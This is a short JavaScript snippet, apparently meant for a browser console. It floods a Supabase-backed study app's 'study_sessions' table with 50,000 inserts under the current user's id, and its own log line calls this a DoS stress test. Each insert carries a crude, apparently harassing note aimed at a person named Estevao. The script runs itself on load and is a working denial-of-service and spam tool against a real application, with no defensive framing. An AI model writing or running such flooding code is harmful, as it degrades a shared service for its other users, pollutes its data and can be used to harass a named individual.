async function spamDatabase() {
    const subjectId = state.subjects[0].id; 
    const userId = currentUser.id;
    console.log("Iniciando teste de stress (DoS)...");
    for (let i = 0; i < 50000; i++) {
        supabaseClient.from('study_sessions').insert({
            user_id: userId,
            subject_id: subjectId,
            duration_seconds: 60,
            notes: "Enfiando no estevao" + i,
            created_at: new Date().toISOString(),
            started_at: new Date().toISOString(),
            ended_at: new Date().toISOString()
        }).then(({error}) => {
            if (error) console.error("Erro", error.message);
        });
        await new Promise(resolve => setTimeout(resolve, 50));
    }
    console.log("Envio em massa concluído.");
}
spamDatabase();